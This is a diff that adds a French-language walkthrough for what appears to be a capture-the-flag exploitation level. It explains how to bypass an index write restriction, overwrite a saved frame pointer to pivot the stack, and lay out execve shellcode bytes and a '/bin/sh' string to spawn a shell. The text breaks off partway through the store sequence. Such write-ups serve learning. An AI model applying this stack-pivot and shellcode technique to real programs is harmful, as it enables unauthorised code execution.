@@ -1,0 +1,57 @@
+Level le plus compliqué de override. Pour commencer, on peut ecrire des octets
+dans une zone memoire donné par le programme. Seulement certaine adresse
+ont la possibilité d'etre ecrite (tous les index qui repondent a cette regle
+sont bloque: index % 3 == 0). Nouveau probleme, le programme efface tous les
+arguments ainsi que lenvironnement, ce qui fait que nous ne pas pouvons simplement
+mettre du shellcode quelque part et redirigé notre programme. Cependant on peut
+acceder a certaine information avec la commande read du programme, notement
+l'adresse de l'index 0 de notre zone memoire. Deuxieme observation interressante,
+si on ecrit a l'index -11, on segfault car on touche a l'adresse ou est situé
+l'ebp sauvegardé de la fonction main et en le modifiant de la bonne maniere, on
+modifie en meme temps l'esp et on peut donc rediriger l'esp sur notre zone memoire.
+On peut du coup choisir la valeur de tous nos registres. On va donc creer notre
+stack personnalisée de but a ce quelle contienne: du shellcode, la valeur des
+registres et un bout de text (/bin/sh). Regarder le schema ci dessous:
+
+//On va faire un syscall sur execve dans notre storage
+//
+//
+//
+//le -11 segfault: on touche a ebp sauvegarder. il suffit de modifier l'ebp pour
+//modifier esp et avoir une stack personnalisee
+//read  -9: adresse de la ou on ecris.
+//read 153: adresse argument
+//
+//
+//0x80cd0bb0 == 2160921520  --> syscall to execve
+//0xe1f7c931 == 3791112497  --> ecx et eax == 0
+//0x6e69622f == 1852400175  == nib/
+//0x0068732f ==    6845231  ==  hs/
+//
+//
+//
+//in -11 => store *(read -9) + 4*4 ----------------------------------------
+//                                                                         |
+//                                                                         |
+//                                                                         |
+//                                                                         |
+//0                                                                        |
+//+1   -> new esp   ==       *(read -9) + 1*4   && pop ebx == (addr stak sh| -> *(read -9) + 7*4)
+//+2   -> pop esi               ^                                          |
+// 3   -> pop edi               | lea    -0xc(%ebp),%esp   <----------------
+//+4   -> new ebp   ==       *(read -9) + 4*4             && pop ebp
+//+5   -> pop eip   => store *(addr shellcode syscall)
+// 6
+//+7   -> store(nib/ == 1852400175)
+//+8   -> store( hs/ ==    6845231)
+// 9
+//+10  -> store(ecx/eax = 0 -> 3791112497)
+//+11  -> store(syscall -> 2160921520)
+//
+//
+//
+//
+//so in order:
+//var addr = *(read -9)
+//store (addr + 4*4) -11
+//store
